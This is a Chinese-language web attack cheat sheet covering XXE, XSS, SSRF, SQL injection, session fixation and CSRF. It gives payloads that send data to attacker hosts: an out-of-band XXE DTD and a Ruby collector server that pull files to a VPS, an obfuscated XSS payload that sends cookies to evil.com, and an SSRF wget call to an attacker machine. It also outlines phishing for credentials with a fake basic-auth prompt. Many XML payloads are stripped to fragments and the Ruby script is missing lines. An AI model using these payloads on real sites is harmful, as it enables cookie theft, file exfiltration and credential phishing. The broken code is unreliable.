# Web Fuzz
## XXE
### 测试方法
发现post请求的接口的时候，可以这样试试：
    ]>
    &test;
如果发现了一个错误：
    ]
    >
    &test;
说明能够解析，试试读文件：
    ]
    >
    &test;
或者用php伪协议：
    ]
    >
    &test;
得到的结果再base64解码即可。
## webgoat8
## 测试方法
试一试是否可以添加实体的评论：
    ]>
    &test;
可以的话，试试file：
    ]>
    &test;
## MUTILLIDAE
要获取mutillidae上的文件，要在form表单提交的过程中使用测试的payload：
     ]
    >
    &TEST;
或者把xml版本忽略掉：
    ]
    >
    &TEST;
以及上面提到的php流：
    ]
    >
    &TEST;
## OUT OF BAND
### 基础测试
  1. 使用 burp 的collaborator 然后单击`copy the payload to clipboard`
  2. 将下面的code放入xml文件，然后上传：
       ]>&xxe;
看看是否发送了请求  
成功后，再利用其他payload
### 读文件
`wing.xml`
      :8000/evil.dtd">
      %dtd;
    ]>
    &send;
`vps->evil.dtd`
    :8000/?collect=%file;'>"> %all;
`host in dtd:`
    python -m SimpleHTTPServer 8000
### 使用FTP读文件
`evil.xml`
    :8090/xxe_file.dtd">
    %asd;
    %c;
    ]>
    &rrr;
`将dtd文件放在VPS上:`
    :2121/%d;'>">
ruby利用脚本：
    require 'socket'
    ftp_server = TCPServer.new 2121
    http_server = TCPServer.new 8088
    log = File.open( "xxe-ftp.log", "a")
    payload = ''
    Thread.start do
    loop do
      Thread.start(http_server.accept) do |http_client|
        puts "HTTP. New client connected" 
        loop {
            req = http_client.gets()
            break if req.nil?
            if req.start_with? "GET"
                http_client.puts("HTTP/1.1 200 OK\r\nContent-length: #{payload.length}\r\n\r\n#{payload}")  
            end
            puts req
        }  
        puts "HTTP. Connection closed" 
      end
    end
    end
    Thread.start do
    loop do
      Thread.start(ftp_server.accept) do |ftp_client|
        puts "FTP. New client connected"
        ftp_client.puts("220 xxe-ftp-server")
        loop {
            req = ftp_client.gets()
            break if req.nil?
            puts " 200 PORT command ok"
                ftp_client.puts("200 PORT command ok")
            else
                puts "> 230 more data please!"
                ftp_client.puts("230 more data please!")
            end
        }
        puts "FTP. Connection closed" 
      end
    end
    end
    loop do
        sleep(10000)
    end
fuzz
    https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt
## XSS
对于asp的站点，我们用unicode编码尖括号，适用于存储型XSS：
    '%uff1cscript%uff1ealert('XSS');%uff1c/script%uff1e'
### 文件上传的XSS
发现上传点的时候，可以试试用payload作为文件名：
    .png
or：
    ">.png
or:
    ">.svg
### SVG
stuff.svg
### XML
    alert(1)
### CSP BYPASS
    script-src self: 
### 常用的payload
  * `svg/onload`
  * `'-alert(1)-'`
  * `eval(atob('YWxlcnQoMSk='))`
  * ``
  * ``  
``
  * `PI:EMAIL --!>`
  * `""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]][(''+{})[5]+(''+{})[1]+((""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]])+"")[2]+(!1+'')[3]+(!0+'')[0]+(!0+'')[1]+(!0+'')[2]+(''+{})[5]+(!0+'')[0]+(''+{})[1]+(!0+'')[1]](((!1+"")[1]+(!1+"")[2]+(!0+"")[3]+(!0+"")[1]+(!0+"")[0])+"(1)")()`
  * `oNcliCk=alert(1)%20)//%0D%0A%0d%0a//%5Cx3csVg/%5Cx3e`
### AUTH CRED
遇到http-only的时候：  
使用钓鱼的基本身份验证获取其凭据
  1. 注册一个和目标类似的域名
  2. 
  3. 编译然后运行
  4. 设置payload----``
  5. 等待目标上线
可还行  
### 偷Cookie
Blacklist bypass:  
过滤了`//,:,",`
    btoa('document.location="http://evil.com:8090/r.php?c="+document.cookie')
payload:
    eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbTo4MDkwL3IucGhwP2M9Iitkb2N1bWVudC5jb29raWU='))
另外一个：
比较不错的一个payload：
nc 监听：
    nc -lvp 8090
### 测试session劫持
利用burp重放功能进行测试。  
看不同cookie会有什么变化。
### FILTER BYPASS RESOURCES
收集到的payload：
    https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
    https://bittherapy.net/a-trick-to-bypass-an-xss-filter-and-execute-javascript/
    https://support.portswigger.net/customer/portal/articles/2590820-bypassing-signature-based-xss-filters-modifying-script-code
    https://brutelogic.com.br/blog/avoiding-xss-detection/
    https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec
### 基于POST的XSS
如果遇到无法将基于POST的XSS转换为GET请求的情况(可能目标服务器上禁用了GET请求)，试试CSRF。
### DOM XSS
    /#
beef的hook，urlencode
    /#img/src/onerror=$("body").append(decodeURIComponent('%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%3a%2f%2f%3c%65%76%69%6c%20%69%70%3e%3a%33%30%30%30%2f%68%6f%6f%6b%2e%6a%73%3e%3c%2f%73%63%72%69%70%74%3e'))>
    #
    #>
这些站点有大量的xss payload
    https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
    https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS injection
    https://zseano.com/tutorials/4.html
    https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md
    http://www.smeegesec.com/2012/06/collection-of-cross-site-scripting-xss.html
    http://www.xss-payloads.com/payloads-list.html?a#category=all
payload生成：
    xssor.io
    http：//www.jsfuck.com/ 
    https://github.com/aemkei/jsfuck 
    https://convert.town/ascii-to-text
    http://jdstiles.com/java/cct.html
## SSRF
在可以控制url参数的情况下，只要不重定向，就可以测试一下SSRF。  
Webhooks, PDF 生成， 文档解析, 文件上传这些地方都可以重点关注一下。
PS:
想办法探测内网资产：  
更换端口，查看回显，判断端口的开放。  
没有回显的情况下，按照响应时间判断，以及DNSLOG，这玩意burp自带的也好用的。  
根据我的经验，一些组件只能使用某些端口，例如80,8080,443等。最好对这些端口进行测试。
如果你的payload中有路径，最好带上&,#
    http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000&
    http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000#
这篇文章对SOP和CORS以及SSRF都有很好的讲解：https//www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/
Bug Bounty Write-ups:
    https://hackerone.com/reports/115748
    https://hackerone.com/reports/301924
    https://www.sxcurity.pro/hackertarget/
    http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html
    https://seanmelia.files.wordpress.com/2016/07/ssrf-to-pivot-internal-networks.pdf
    https://github.com/ngalongc/bug-bounty-reference#server-side-request-forgery-ssrf
    https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/
## SQL注入
使用SQLMap在PUT REST Params中测试SQLi：
    1. 使用 *标记Vulnerable参数
    2. 复制请求并将其粘贴到文件中。
    3. 用sqlmap运行：
    sqlmap -r  -vvvv
备忘录:
可以试试双编码输入。
## 会话固定
快速检查的方法，可用于确定会话固定漏洞是否是网站上的问题：
    转到登录页面，观察未经身份验证的用户拥有的会话ID。
    登录该站点。进入后，观察用户拥有的会话ID。如果会话ID与用户进行身份验证之前由站点提供的会话ID匹配，那么存在会话固定漏洞。
## CSRF
一些绕过技术，即使有CSRF Token:  
csrf和reset api: